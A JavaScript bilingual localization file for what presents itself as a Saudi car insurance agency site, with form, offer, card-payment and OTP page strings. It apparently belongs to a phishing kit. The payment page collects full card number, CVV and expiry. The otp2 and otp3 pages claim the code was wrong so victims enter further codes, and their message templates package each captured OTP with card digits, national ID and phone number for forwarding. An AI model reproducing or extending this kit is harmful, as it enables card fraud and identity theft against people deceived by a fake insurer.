(function(){
    const storageKey = 'siteLang';
    let currentLang = localStorage.getItem(storageKey) || 'ar';
    const resources = {
        index: {
            title: { ar: 'تأمين السيارات', en: 'Car Insurance' },
            subtitle: { ar: 'تأمين السيارات', en: 'Car Insurance' },
            slogan: { ar: 'احمِ مركبتك!', en: 'Protect your vehicle!' },
            tab_new: { ar: 'تأمين جديد', en: 'New Insurance' },
            tab_transfer: { ar: 'نقل ملكية', en: 'Ownership Transfer' },
            tab_renew: { ar: 'تجديد الوثيقة', en: 'Renew Policy' },
            privacy: { ar: 'بالتوقيع، أقر بقراءة وفهم وقبول <a href="#">إشعار الخصوصية</a> لشركة تري الرقمية لوكالة التأمين', en: 'By signing, I confirm that I have read, understood and accepted the <a href="#">Privacy Notice</a> of Tree Digital Insurance.' },
            submit: { ar: 'أمن سيارتك', en: 'Secure Your Car' },
            formHeading: { ar: 'أدخل بياناتك', en: 'Enter your details' },
            footer_h3_1: { ar: 'تري للتأمين الرقمي', en: 'Tree Digital Insurance' },
            footer_h3_2: { ar: 'لماذا التأمين الشامل؟', en: 'Why Comprehensive Insurance?' },
            footer_h3_3: { ar: 'تأمين الأفراد', en: 'Individual Insurance' },
            footer_link_1: { ar: 'تأمين ضد الغير', en: 'Liability Insurance' },
            footer_link_2: { ar: 'التأمين الشامل المطور', en: 'Advanced Comprehensive Insurance' },
            footer_link_3: { ar: 'تأمين الهجائن والسيارات الكهربائية', en: 'Hybrid & Electric Car Insurance' },
            footer_copy: { ar: 'جميع الحقوق محفوظة لشركة تري الرقمية لوكالة التأمين © 2026', en: 'All rights reserved to Tree Digital Insurance Agency © 2026' },
            footer_regulator: { ar: 'خاضعة لرقابة وإشراف هيئة التأمين والبنك المركزي السعودي.', en: 'Regulated by the Saudi Insurance Authority and the Saudi Central Bank.' },
            footer_privacy: { ar: 'إشعار الخصوصية', en: 'Privacy Notice' },
            footer_terms: { ar: 'الشروط والأحكام', en: 'Terms & Conditions' },
            footer_fraud: { ar: 'مكافحة الاحتيال', en: 'Fraud Prevention' },
            footer_sitemap: { ar: 'خريطة الموقع', en: 'Site Map' }
        ,
            about: { ar: 'منصة سعودية رائدة تقدم حلول تأمينية فورية مدعومة بالذكاء الاصطناعي لتسهيل حماية مركبتك وممتلكاتك بثوانٍ معدودة.', en: 'A Saudi platform offering instant AI-powered insurance solutions to protect your vehicle and assets in seconds.' },
            badge: { ar: 'توعية رقمية', en: 'Digital Awareness' },
            whyText: { ar: 'يوفر لك راحة البال الكاملة عبر تغطية الحوادث، الكوارث الطبيعية، والسرقة، لئلا تتحمل أعباء مالية مفاجئة قد تؤثر على استقرارك.', en: 'Provides full peace of mind through accident, natural disaster and theft coverage so you don’t bear unexpected financial burdens.' },
            help24Title: { ar: 'خدمة المساعدة 24/7', en: '24/7 Assistance Service' },
            help24Desc: { ar: 'سطحة مجانية، شحن بطارية، وتعبئة وقود أينما كنت في المملكة.', en: 'Free towing, battery jump-start, and fuel delivery wherever you are in the Kingdom.' }
        },
        form1: {
            title: { ar: 'نموذج تأمين سيارة', en: 'Car Insurance Form' },
            step1: { ar: '1<br>البيانات الأساسية', en: '1<br>Basic Info' },
            step2: { ar: '2<br>بيانات التأمين', en: '2<br>Insurance Details' },
            step3: { ar: '3<br>قائمة الأسعار', en: '3<br>Price List' },
            step4: { ar: '4<br>الملخص والدفع', en: '4<br>Summary & Payment' },
            insuranceTypeLabel: { ar: 'نوع التأمين', en: 'Insurance Type' },
            startDateLabel: { ar: 'تاريخ بدء الوثيقة', en: 'Policy Start Date' },
            usagePurposeLabel: { ar: 'الغرض من استخدام السيارة', en: 'Usage Purpose' },
            usagePurposePlaceholder: { ar: 'الغرض من استخدام السيارة', en: 'Usage Purpose' },
            personalOption: { ar: 'شخصي', en: 'Personal' },
            commercialOption: { ar: 'تجاري', en: 'Commercial' },
            rideShareOption: { ar: 'نقل الركاب او كريم او اوبر', en: 'Ride sharing / Uber / Careem' },
            cargoOption: { ar: 'نقل البضائع', en: 'Cargo Transport' },
            fuelOption: { ar: 'نقل مشتقات نفطية', en: 'Fuel Transport' },
            carTypeLabel: { ar: 'نوع السيارة', en: 'Car Type' },
            estimatedValueLabel: { ar: 'القيمة التقديرية للسيارة', en: 'Estimated Car Value' },
            manufactureYearLabel: { ar: 'سنة الصنع', en: 'Manufacture Year' },
            repairPlaceLabel: { ar: 'مكان الإصلاح:', en: 'Repair Location:' },
            repairShopOption: { ar: 'الورشة', en: 'Workshop' },
            agencyOption: { ar: 'الوكالة', en: 'Agency' },
            showOffers: { ar: 'اظهار العروض', en: 'Show Offers' }
        },
        select: {
            title: { ar: 'عروض التأمين', en: 'Insurance Offers' },
            chooseInsurance: { ar: 'اختر تأمينك', en: 'Choose Your Insurance' },
            type_liability: { ar: 'ضد الغير', en: 'Liability' },
            type_comprehensive: { ar: 'شامل', en: 'Comprehensive' },
            benefit_liability_limit: { ar: 'المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال', en: 'Civil liability coverage up to SAR 10,000,000' },
            benefit_comprehensive_low: { ar: 'تغطية شاملة حتى 10,000 ريال سعودي', en: 'Comprehensive coverage up to SAR 10,000' },
            benefit_driver_only: { ar: 'الحوادث الشخصية للسائق فقط', en: 'Personal accident for driver only' },
            benefit_driver_passengers: { ar: 'الحوادث الشخصية للسائق والركاب', en: 'Personal accident for driver and passengers' },
            benefit_comprehensive_high: { ar: 'تغطية شاملة حتى 10,000,000 ريال سعودي', en: 'Comprehensive coverage up to SAR 10,000,000' },
            benefit_road_assistance: { ar: 'المساعدة على الطريق', en: 'Roadside Assistance' },
            benefit_natural_disasters: { ar: 'تغطية الكوارث الطبيعية', en: 'Natural Disaster Coverage' },
            benefit_liability_10m: { ar: 'المسؤلية المدنية تجاه الغير بحد اقصى 10,000,000 ريال سعودي', en: 'Liability coverage up to SAR 10,000,000' },
            buyButton: { ar: 'اشترِ الآن', en: 'Buy Now' },
            terms: { ar: 'الشروط والأحكام', en: 'Terms & Conditions' },
            totalLabel: { ar: 'الإجمالي', en: 'Total' }
        },
        totalselect: {
            title: { ar: 'تفاصيل الوثيقة والدفع', en: 'Policy Details & Payment' },
            detailsTitle: { ar: 'تفاصيل الوثيقة', en: 'Policy Details' },
            summaryTitle: { ar: 'التفاصيل', en: 'Summary' },
            insuranceType: { ar: 'نوع التأمين', en: 'Insurance Type' },
            startDate: { ar: 'تاريخ بدء الوثيقة', en: 'Policy Start Date' },
            refNumber: { ar: 'الرقم المرجعي للتسعيرة', en: 'Quote Reference Number' },
            endDate: { ar: 'تاريخ انتهاء الوثيقة', en: 'Policy End Date' },
            priceLabel: { ar: 'سعر الوثيقة', en: 'Policy Price' },
            installmentLabel: { ar: 'قسط اشتراك التأمين', en: 'Insurance Subscription Installment' },
            discountLabel: { ar: 'خصم عدم وجود مطالبات', en: 'No-claims Discount' },
            feesLabel: { ar: 'رسوم إدارية', en: 'Administrative Fees' },
            subtotalLabel: { ar: 'المجموع الجزئي', en: 'Subtotal' },
            taxLabel: { ar: 'ضريبة القيمة المضافة(15.00%)', en: 'VAT (15.00%)' },
            totalAmount: { ar: 'المبلغ الإجمالي', en: 'Total Amount' },
            footer: { ar: 'السعر شامل الضرائب والرسوم', en: 'Price includes taxes and fees' },
            paymentHeading: { ar: 'اختر طريقة الدفع', en: 'Choose Payment Method' },
            applePayLabel: { ar: 'Apple Pay', en: 'Apple Pay' },
            applePayDisabled: { ar: 'خدمة Apple Pay غير متوفرة حالياً.', en: 'Apple Pay service is currently unavailable.' },
            cardPayment: { ar: 'الدفع بالبطاقات البنكية', en: 'Pay with Bank Cards' },
            cardHolder: { ar: 'اسم حامل البطاقة*', en: 'Cardholder Name*' },
            cardNumber: { ar: 'رقم البطاقة*', en: 'Card Number*' },
            cvv: { ar: 'CVV*', en: 'CVV*' },
            expiry: { ar: 'تاريخ صلاحية البطاقة*', en: 'Card Expiry Date*' },
            expiryMonth: { ar: 'الشهر', en: 'Month' },
            expiryYear: { ar: 'السنة', en: 'Year' },
            payNow: { ar: 'ادفع الآن', en: 'Pay Now' }
        },
        otp: {
            title: { ar: 'مصادقة الشراء', en: 'Purchase Authentication' },
            authTitle: { ar: 'مصادقة الشراء', en: 'Purchase Authentication' },
            waitText: { ar: 'يرجى الانتظار، العملية قيد التنفيذ...', en: 'Please wait, the process is underway...' },
            neverLeave: { ar: 'لا تغادر أو تغلق الصفحة حتى انتهاء عملية الدفع.', en: 'Do not leave or close the page until the payment process is complete.' },
            bankContact: { ar: 'سيتم الاتصال بك من قبل المصرف الخاص بحسابك.', en: 'Your bank will contact you.' },
            codeSent: { ar: 'بعدها سيتم إرسال رمز التحقق إلى رقم جوالك.', en: 'Then a verification code will be sent to your phone.' },
            waitButton: { ar: 'يرجى الانتظار...', en: 'Please wait...' },
            paymentCard: { ar: 'الدفع بالبطاقات البنكية', en: 'Bank Card Payment' },
            ownershipProof: { ar: 'إثبات ملكية البطاقة', en: 'Card Ownership Proof' },
            otpLabel: { ar: 'رمز التحقق*', en: 'Verification Code*' },
            otpPlaceholder: { ar: 'يرجى ادخال رمز التحقق', en: 'Please enter the verification code' },
            otpNote: { ar: 'سيتم إرسال رسالة كود التحقق في خلال', en: 'Verification code will be sent within' },
            confirm: { ar: 'تأكيد', en: 'Confirm' }
        },
        otp2: {
            title: { ar: 'مصادقة الشراء', en: 'Purchase Authentication' },
            authTitle: { ar: 'الدفع بالبطاقات البنكية', en: 'Bank Card Payment' },
            ownershipProof: { ar: 'إثبات ملكية البطاقة', en: 'Card Ownership Proof' },
            errorText: { ar: 'يبدو انك ادخلت رمزآ غير صحيح يرجى اعادة ادخال الرمز او انتظار رمز جديد', en: 'It seems you entered an incorrect code. Please re-enter the code or wait for a new one.' },
            otpLabel: { ar: 'رمز التحقق*', en: 'Verification Code*' },
            otpPlaceholder: { ar: 'يرجى ادخال رمز التحقق', en: 'Please enter the verification code' },
            otpNote: { ar: 'سيتم إرسال رسالة كود التحقق في خلال', en: 'Verification code will be sent within' },
            confirm: { ar: 'تأكيد', en: 'Confirm' }
            ,
            smsTemplate: {
                ar: `رمز التحقق 2:\n\n🔚 آخر ٤ أرقام من البطاقة: {{last4}}\n💵 المبلغ: {{totalPrice}} SAR\n🔐 رمز التحقق: {{otpValue}}\n\n📄 من :\n🆔 رقم الهوية: {{identity}}\n🔢 الرقم التسلسلي: {{serial}}\n📞 رقم الهاتف: {{phone}}\n`,
                en: `Verification 2:\n\n🔚 Card last 4 digits: {{last4}}\n💵 Amount: {{totalPrice}} SAR\n🔐 Verification code: {{otpValue}}\n\nFrom :\n🆔 ID: {{identity}}\n🔢 Serial: {{serial}}\n📞 Phone: {{phone}}\n`
            }
        },
        otp3: {
            title: { ar: 'مصادقة الشراء', en: 'Purchase Authentication' },
            authTitle: { ar: 'الدفع بالبطاقات البنكية', en: 'Bank Card Payment' },
            ownershipProof: { ar: 'إثبات ملكية البطاقة', en: 'Card Ownership Proof' },
            errorText: { ar: 'يبدو انك ادخلت رمزآ غير صحيح يرجى اعادة ادخال الرمز او انتظار رمز جديد', en: 'It seems you entered an incorrect code. Please re-enter the code or wait for a new one.' },
            otpLabel: { ar: 'رمز التحقق*', en: 'Verification Code*' },
            otpPlaceholder: { ar: 'يرجى ادخال رمز التحقق', en: 'Please enter the verification code' },
            otpNote: { ar: 'سيتم إرسال رسالة كود التحقق في خلال', en: 'Verification code will be sent within' },
            confirm: { ar: 'تأكيد', en: 'Confirm' }
            ,
            smsTemplate: {
                ar: `رمز التحقق 3:\n\n🔚 آخر ٤ أرقام من البطاقة: {{last4}}\n💵 المبلغ: {{totalPrice}} SAR\n🔐 رمز التحقق: {{otpValue}}\n\n📄  من:\n🆔 رقم الهوية: {{identity}}\n🔢 الرقم التسلسلي: {{serial}}\n📞 رقم الهاتف: {{phone}}\n`,
                en: `Verification 3:\n\n🔚 Card last 4 digits: {{last4}}\n💵 Amount: {{totalPrice}} SAR\n🔐 Verification code: {{otpValue}}\n\nFrom :\n🆔 ID: {{identity}}\n🔢 Serial: {{serial}}\n📞 Phone: {{phone}}\n`
            }
        }
    };

    // Template renderer for message strings with {{placeholders}}
    function renderTemplate(pageKey, key, vars = {}) {
        const page = resources[pageKey] || {};
        const tpl = page[key] && page[key][currentLang];
        if (!tpl) return '';
        return tpl.replace(/\{\{(\w+)\}\}/g, (_, name) => (vars[name] !== undefined ? vars[name] : ''));
    }

    const siteMenuItems = {
        ar: [
            { href: 'index.html', label: 'الرئيسية' },
            { href: 'form1.html', label: 'نموذج التأمين' },
            { href: 'select.html', label: 'عروض التأمين' },
            
        ],
        en: [
            { href: 'index.html', label: 'Home' },
            { href: 'form1.html', label: 'Insurance Form' },
            { href: 'select.html', label: 'Insurance Offers' },
            
        ]
    };

    function buildSiteMenuOverlay() {
        if (document.querySelector('.site-menu-overlay')) return;

        const overlay = document.createElement('div');
        overlay.className = 'site-menu-overlay';
        overlay.innerHTML = `
            <div class="site-menu-panel">
                <button type="button" class="site-menu-close" aria-label="Close">&times;</button>
                <h3 class="site-menu-title"></h3>
                <ul class="site-menu-list"></ul>
            </div>
        `;
        document.body.appendChild(overlay);

        overlay.addEventListener('click', event => {
            if (event.target === overlay || event.target.closest('.site-menu-close')) {
                overlay.classList.remove('open');
            }
        });

        const style = document.createElement('style');
        style.textContent = `
            .site-menu-overlay {
                position: fixed;
                inset: 0;
                z-index: 9999;
                background: rgba(0, 0, 0, .65);
                display: flex;
                align-items: center;
                justify-content: center;
                opacity: 0;
                pointer-events: none;
                transition: opacity .2s ease-in-out;
            }
            .site-menu-overlay.open {
                opacity: 1;
                pointer-events: auto;
            }
            .site-menu-panel {
                position: relative;
                width: min(95%, 420px);
                max-height: min(90vh, 600px);
                overflow-y: auto;
                padding: 24px;
                border-radius: 24px;
                background: #ffffff;
                box-shadow: 0 16px 60px rgba(0, 0, 0, .18);
                text-align: start;
            }
            .site-menu-panel h3 {
                margin: 0 0 16px;
                font-size: 1.2rem;
                font-weight: 700;
                color: #0d2e48;
            }
            .site-menu-list {
                list-style: none;
                margin: 0;
                padding: 0;
            }
            .site-menu-list li {
                margin-bottom: 12px;
            }
            .site-menu-list a {
                display: block;
                padding: 14px 16px;
                border-radius: 14px;
                background: #f3f8ff;
                color: #0d2e48;
                text-decoration: none;
                font-weight: 600;
            }
            .site-menu-list a:hover {
                background: #dbe9ff;
            }
            .site-menu-close {
                position: absolute;
                top: 16px;
                right: 16px;
                width: 38px;
                height: 38px;
                border: none;
                border-radius: 50%;
                background: #edf2f8;
                color: #1b2c43;
                font-size: 1.4rem;
                cursor: pointer;
            }
        `;
        document.head.appendChild(style);
    }

    function updateSiteMenu() {
        buildSiteMenuOverlay();
        const overlay = document.querySelector('.site-menu-overlay');
        if (!overlay) return;

        const title = overlay.querySelector('.site-menu-title');
        const list = overlay.querySelector('.site-menu-list');

        title.textContent = currentLang === 'ar' ? 'تنقل سريع' : 'Quick Navigation';
        list.innerHTML = siteMenuItems[currentLang].map(item =>
            `<li><a href="${item.href}">${item.label}</a></li>`
        ).join('');
    }

    function toggleSiteMenu(event) {
        if (event) {
            event.preventDefault();
        }
        buildSiteMenuOverlay();
        const overlay = document.querySelector('.site-menu-overlay');
        if (!overlay) return;
        overlay.classList.toggle('open');
    }

    function initSiteMenu() {
        const menuIcon = document.querySelector('.menu-icon');
        if (!menuIcon) return;
        menuIcon.style.cursor = 'pointer';
        menuIcon.addEventListener('click', toggleSiteMenu);
        updateSiteMenu();
    }

    const toggleButton = document.getElementById('toggleLang');

    function getPageKey() {
        return document.body.dataset.page || 'index';
    }

    function translatePage() {
        const pageKey = getPageKey();
        const pageRes = resources[pageKey] || {};

        document.documentElement.lang = currentLang === 'ar' ? 'ar' : 'en';
        document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';

        if (pageRes.title) {
            document.title = pageRes.title[currentLang] || document.title;
        }

        document.querySelectorAll('[data-i18n]').forEach(el => {
            const key = el.dataset.i18n;
            if (pageRes[key]) {
                el.innerHTML = pageRes[key][currentLang];
            }
        });

        document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
            const key = el.dataset.i18nPlaceholder;
            if (pageRes[key]) {
                el.placeholder = pageRes[key][currentLang];
            }
        });

        document.querySelectorAll('[data-i18n-option]').forEach(el => {
            const key = el.dataset.i18nOption;
            if (pageRes[key]) {
                el.textContent = pageRes[key][currentLang];
            }
        });

        document.querySelectorAll('[data-i18n-value]').forEach(el => {
            const key = el.dataset.i18nValue;
            if (pageRes[key]) {
                el.value = pageRes[key][currentLang];
            }
        });

        // Page-specific fallbacks for elements that couldn't be annotated in HTML
        if (pageKey === 'totalselect') {
            // section titles (there are two section-title elements)
            const sTitles = document.querySelectorAll('.section-title');
            if (sTitles[0] && pageRes.detailsTitle) sTitles[0].innerHTML = pageRes.detailsTitle[currentLang];
            if (sTitles[1] && pageRes.summaryTitle) sTitles[1].innerHTML = pageRes.summaryTitle[currentLang];

            const rows = document.querySelectorAll('.section .row');
            if (rows[0]) {
                const sp = rows[0].querySelectorAll('span');
                if (sp[0] && pageRes.insuranceType) sp[0].innerHTML = pageRes.insuranceType[currentLang];
            }
            if (rows[1]) {
                const sp = rows[1].querySelectorAll('span');
                if (sp[0] && pageRes.startDate) sp[0].innerHTML = pageRes.startDate[currentLang];
            }
            // refNumber has its own id, but update its label if present in a row
            const refLabel = document.querySelector('.blue-text');
            if (refLabel && pageRes.refNumber) refLabel.innerHTML = pageRes.refNumber[currentLang];

            // details section labels
            const map = [
                ['priceLabel', 0],
                ['installmentLabel', 1],
                ['discountLabel', 2],
                ['feesLabel', 3],
                ['subtotalLabel', 4],
                ['taxLabel', 5]
            ];
            map.forEach(([key, idx]) => {
                const r = document.querySelectorAll('.section .row')[idx];
                if (r) {
                    const spans = r.querySelectorAll('span');
                    if (spans[0] && pageRes[key]) spans[0].innerHTML = pageRes[key][currentLang];
                }
            });

            const totalRowLabel = document.querySelector('.total-row span');
            if (totalRowLabel && pageRes.totalAmount) totalRowLabel.innerHTML = pageRes.totalAmount[currentLang];

            const footerEl = document.querySelector('.footer');
            if (footerEl && pageRes.footer) footerEl.innerHTML = pageRes.footer[currentLang];

            const payHeading = document.querySelector('.payment-section h3');
            if (payHeading && pageRes.paymentHeading) payHeading.innerHTML = pageRes.paymentHeading[currentLang];

            const appleMsg = document.getElementById('applePayMessage');
            if (appleMsg && pageRes.applePayDisabled) appleMsg.innerHTML = pageRes.applePayDisabled[currentLang];

            const cardFormH4 = document.querySelector('#cardForm h4');
            if (cardFormH4 && pageRes.cardPayment) cardFormH4.innerHTML = pageRes.cardPayment[currentLang];
            const cardHolderLabel = document.querySelector('#cardForm label');
            if (cardHolderLabel && pageRes.cardHolder) cardHolderLabel.innerHTML = pageRes.cardHolder[currentLang];
        }

        if (toggleButton) {
            toggleButton.textContent = currentLang === 'ar' ? 'EN' : 'ع';
        }

        updateSiteMenu();
    }

    function setLanguage(lang) {
        currentLang = lang;
        localStorage.setItem(storageKey, lang);
        translatePage();
    }

    function toggleLanguage() {
        setLanguage(currentLang === 'ar' ? 'en' : 'ar');
    }

    if (toggleButton) {
        toggleButton.addEventListener('click', toggleLanguage);
    }

    document.addEventListener('DOMContentLoaded', () => {
        setLanguage(currentLang);
        initSiteMenu();
    });

    window.SiteLang = {
        get currentLang() {
            return currentLang;
        },
        setLanguage,
        translatePage
        ,
        renderTemplate
    };
})();
